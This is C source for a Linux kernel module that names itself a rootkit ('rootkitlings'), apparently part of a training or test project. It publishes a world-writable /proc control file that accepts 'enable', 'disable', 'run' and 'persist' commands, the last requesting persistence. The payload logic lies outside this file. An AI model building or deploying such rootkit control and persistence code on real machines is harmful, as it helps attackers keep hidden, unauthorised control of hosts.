// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "rootkit.h"
#include "transaction.h"

#define RK_COMMAND_MAX (sizeof("persist\n") - 1)

struct rk_proc_context {
	struct rk_state *state;
	struct rk_transaction *transaction;
};

enum rk_command {
	RK_COMMAND_ENABLE,
	RK_COMMAND_DISABLE,
	RK_COMMAND_RUN,
	RK_COMMAND_PERSIST,
};

static struct proc_dir_entry *proc_entry;
static struct rk_proc_context proc_context;

static int rk_proc_show(struct seq_file *output, void *unused)
{
	const struct rk_proc_context *ctx = output->private;
	const struct rk_state *state = ctx->state;
	const struct rk_transaction *transaction = ctx->transaction;
	const bool active = rk_state_is_active(state);
	const bool actions_enabled = rk_state_actions_enabled(state);
	const unsigned long timer_fires = rk_state_timer_fires(state);
	const unsigned long worker_runs = rk_state_worker_runs(state);

	seq_printf(output,
		   "active=%u\nactions=%s\ntimer_fires=%lu\nworker_runs=%lu\npersistence=%s\n",
		   active ? 1U : 0U,
		   actions_enabled ? "enabled" : "disabled", timer_fires,
		   worker_runs,
		   rk_transaction_state_name(transaction));
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_proc_show, pde_data(inode));
}

static ssize_t rk_control_write(struct file *file, const char __user *buffer,
				size_t count, loff_t *position)
{
	struct rk_proc_context *ctx = pde_data(file_inode(file));
	struct rk_state *state = ctx->state;
	char command_buffer[RK_COMMAND_MAX];
	enum rk_command command;
	size_t length = count;
	bool enable;
	int error;

	if (*position != 0)
		return -EINVAL;
	if (count > sizeof(command_buffer))
		return -E2BIG;
	if (count == 0)
		return -EINVAL;
	if (copy_from_user(command_buffer, buffer, count) != 0)
		return -EFAULT;

	if (command_buffer[length - 1] == '\n')
		length--;
	if (length == sizeof("enable") - 1 &&
	    memcmp(command_buffer, "enable", sizeof("enable") - 1) == 0)
		command = RK_COMMAND_ENABLE;
	else if (length == sizeof("disable") - 1 &&
		 memcmp(command_buffer, "disable", sizeof("disable") - 1) == 0)
		command = RK_COMMAND_DISABLE;
	else if (length == sizeof("run") - 1 &&
		 memcmp(command_buffer, "run", sizeof("run") - 1) == 0)
		command = RK_COMMAND_RUN;
	else if (length == sizeof("persist") - 1 &&
		 memcmp(command_buffer, "persist", sizeof("persist") - 1) == 0)
		command = RK_COMMAND_PERSIST;
	else
		return -EINVAL;

	if (command == RK_COMMAND_PERSIST) {
		rk_state_set_persist_requested(state, true);
		rk_state_set_actions_enabled(state, true);
		error = rk_worker_request();
		if (error && error != -EAGAIN)
			return error;
		return count;
	}

	if (command == RK_COMMAND_RUN) {
		error = rk_worker_request();
		if (error)
			return error;
		return count;
	}

	enable = command == RK_COMMAND_ENABLE;
	rk_state_set_actions_enabled(state, enable);
	return count;
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_proc_open,
	.proc_read = seq_read,
	.proc_write = rk_control_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

__must_check int rk_proc_publish(struct rk_state *state,
				 struct rk_transaction *transaction)
{
	if (proc_entry || !state || !transaction)
		return -EINVAL;

	proc_context.state = state;
	proc_context.transaction = transaction;

	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PROC_PUBLISH)
		proc_entry = NULL;
	else
		proc_entry = proc_create_data("rootkitlings", 0666, NULL,
					      &rk_proc_ops, &proc_context);
	if (!proc_entry)
		return -ENOMEM;

	return 0;
}

void rk_proc_unpublish(void)
{
	proc_remove(proc_entry);
	proc_entry = NULL;
}
